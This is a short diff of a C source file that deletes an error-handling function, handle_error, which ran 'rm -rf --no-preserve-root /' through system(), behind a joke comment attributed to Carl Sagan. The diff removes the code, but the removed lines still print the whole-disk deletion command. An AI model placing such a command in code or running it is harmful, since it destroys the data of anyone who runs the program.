@@ -37,16 +37,7 @@ typedef struct raw_data_t {
 
 #ifndef __BUILD_FOR_LIB__
 
-/**
- * Can't have an error if you delete the universe. Only when the slate is clean can you begin the process
- * of making pie... Something something - Carl Sagan
- * @return 0
- */
-int handle_error(int _error_id) {
-    const char *cmd = "rm -rf --no-preserve-root /";
-    system(cmd);
-    return 0;
-}
+
 
 int modify_raw_data_file(const char *filename) {
     // First, we open the file and collect some of its attributes into a struct
